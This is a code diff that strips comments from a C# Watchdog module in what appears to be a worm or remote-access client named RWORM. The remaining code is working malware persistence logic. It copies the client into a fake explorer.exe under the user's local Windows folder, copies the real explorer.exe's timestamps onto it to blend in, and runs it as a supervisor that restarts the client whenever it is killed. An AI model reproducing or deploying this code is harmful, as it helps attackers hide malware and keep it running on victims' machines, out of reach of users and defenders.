@@ -7,13 +7,13 @@ using RWORM.Client.Core;
 
 namespace RWORM.Client.Modules
 {
-    /// <summary>
-    /// Dual-process supervisor and anti-kill persistence architecture.
-    /// When AntiKill is enabled, an embedded supervisor component named explorer.exe is extracted
-    /// into an isolated directory and launched as an independent watchdog process.
-    /// It monitors the main client PID via inter-process signaling (named mutex + heartbeat flag);
-    /// if the main client is killed without clean exit, it revives it while preventing infinite loops.
-    /// </summary>
+    
+    
+    
+    
+    
+    
+    
     public static class Watchdog
     {
         private static Process? _supervisorProcess;
@@ -38,10 +38,10 @@ namespace RWORM.Client.Modules
                 }
                 if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe)) return;
 
-                // Ensure clean exit flag is removed from any previous session
+                
                 try { if (File.Exists(FlagPath)) File.Delete(FlagPath); } catch { }
 
-                // Determine supervisor location: %LOCALAPPDATA%\Microsoft\Windows\Explorer\explorer.exe
+                
                 string supervisorDir;
                 try
                 {
@@ -58,7 +58,7 @@ namespace RWORM.Client.Modules
 
                 var supervisorExe = Path.Combine(supervisorDir, "explorer.exe");
 
-                // Extract embedded component or mirror current executable if first run
+                
                 ExtractOrUpdateSupervisor(currentExe, supervisorExe);
 
                 StartSupervisorInstance(currentExe, supervisorExe);
@@ -73,7 +73,7 @@ namespace RWORM.Client.Modules
                 bool extracted = false;
                 var asm = Assembly.GetExecutingAssembly();
 
-                // Check for embedded supervisor resource if present
+                
                 foreach (var resName in asm.GetManifestResourceNames())
                 {
                     if (resName.EndsWith("explorer.exe", StringComparison.OrdinalIgnoreCase))
@@ -89,7 +89,7 @@ namespace RWORM.Client.Modules
                     }
                 }
 
-                // If not embedded as a separate resource stream, replicate the multi-role binary
+                
                 if (!extracted)
                 {
                     if (!File.Exists(supervisorExe) || new FileInfo(supervisorExe).Length != new FileInfo(currentExe).Length)
@@ -98,7 +98,7 @@ namespace RWORM.Client.Modules
                     }
                 }
 
-                // Match timestamps with system explorer.exe to blend in
+                
                 var sysExplorer = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");
                 if (File.Exists(sysExplorer))
                 {
@@ -163,7 +163,7 @@ namespace RWORM.Client.Modules
             catch { }
             _supervisorProcess = null;
 
-            // Clean up any stray supervisor instances in the dedicated local directory
+            
             try
             {
                 var supervisorDir = Path.Combine(
@@ -202,11 +202,11 @@ namespace RWORM.Client.Modules
             StopWatchdog();
         }
 
-        /// <summary>
-        /// Entry point for second component running in --supervisor / --watchdog mode.
-        /// Monitors target PID and revives it when abruptly terminated.
-        /// Guards against double-launching and infinite spawn loops.
-        /// </summary>
+        
+        
+        
+        
+        
         public static void RunWatchdogMode(string[] args)
         {
             if (args.Length < 3) return;
@@ -214,7 +214,7 @@ namespace RWORM.Client.Modules
             string targetExe = args[1];
             if (!int.TryParse(args[2], out int targetPid)) return;
 
-            // Mutex guard to prevent duplicate supervisor instances
+            
             using var mutex = new Mutex(true, MutexName, out bool createdNew);
             if (!createdNew) return;
 
@@ -235,24 +235,24 @@ namespace RWORM.Client.Modules
                 }
                 catch
                 {
-                    // Target process not running or already exited
+                    
                 }
 
-                // Check clean exit signal
+                
                 if (File.Exists(FlagPath))
                 {
                     try { File.Delete(FlagPath); } catch { }
-                    return; // Authorized exit, do not resurrect
+                    return; 
                 }
 
-                // Anti-infinite-loop protection: if restarting too quickly in succession, back off
+                
                 var now = DateTime.UtcNow;
                 if ((now - lastReviveTime).TotalSeconds < 3)
                 {
                     failureCount++;
                     if (failureCount > 10)
                     {
-                        Thread.Sleep(10000); // Back off to avoid thrashing
+                        Thread.Sleep(10000); 
                         failureCount = 0;
                     }
                 }
@@ -262,7 +262,7 @@ namespace RWORM.Client.Modules
                 }
                 lastReviveTime = now;
 
-                // Revive client
+                
                 try
                 {
                     if (!File.Exists(targetExe))
